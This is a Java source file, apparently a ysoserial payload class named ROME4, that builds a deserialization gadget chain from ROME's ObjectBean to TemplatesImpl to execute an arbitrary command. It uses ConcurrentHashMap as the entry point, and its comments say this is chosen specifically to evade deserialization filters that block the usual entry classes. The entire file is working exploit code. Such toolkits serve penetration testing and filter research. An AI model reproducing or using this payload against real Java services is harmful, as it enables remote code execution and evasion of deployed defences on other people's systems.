package ysoserial.payloads;

import java.lang.reflect.Field;
import java.util.concurrent.ConcurrentHashMap;

import javax.xml.transform.Templates;

import com.sun.syndication.feed.impl.ObjectBean;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	ROME variant using ConcurrentHashMap entry point - bypasses HashMap filters.

	Gadget chain:
		ObjectInputStream.readObject()
			ConcurrentHashMap.readObject()
				ConcurrentHashMap.putVal()
					key.hashCode()
						ObjectBean.hashCode()
							EqualsBean.beanHashCode()
								ObjectBean.toString()
									ToStringBean.toString()
										BeanIntrospector iterates getters
											TemplatesImpl.getOutputProperties()
												TemplatesImpl.newTransformer()
													defineTransletClasses() -> RCE

	Differs from ROME (HashMap), ROME2 (BadAttributeValueExpException),
	ROME3 (Hashtable) - all three entry classes are commonly filtered.
	ConcurrentHashMap is almost never blocked.

	Requires:
		rome 1.0
 */

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies("rome:rome:1.0")
@Authors({ Authors.BOFEI_CHEN })
public class ROME4 extends PayloadRunner implements ObjectPayload<ConcurrentHashMap> {

	public ConcurrentHashMap getObject(final String command) throws Exception {
		final Object tpl = Gadgets.createTemplatesImpl(command);
		final ObjectBean delegate = new ObjectBean(Templates.class, tpl);
		final ObjectBean root = new ObjectBean(ObjectBean.class, delegate);

		// ConcurrentHashMap as entry - readObject -> putVal -> key.hashCode()
		final ConcurrentHashMap<Object, Object> chm = new ConcurrentHashMap<Object, Object>(1);
		chm.put("dummy", "bar");

		// Replace key in internal Node table
		Field tableField = ConcurrentHashMap.class.getDeclaredField("table");
		Reflections.setAccessible(tableField);
		Object[] table = (Object[]) tableField.get(chm);

		for (int i = 0; i < table.length; i++) {
			if (table[i] != null) {
				Field keyField = table[i].getClass().getDeclaredField("key");
				Reflections.setAccessible(keyField);
				keyField.set(table[i], root);
				break;
			}
		}

		return chm;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(ROME4.class, args);
	}
}
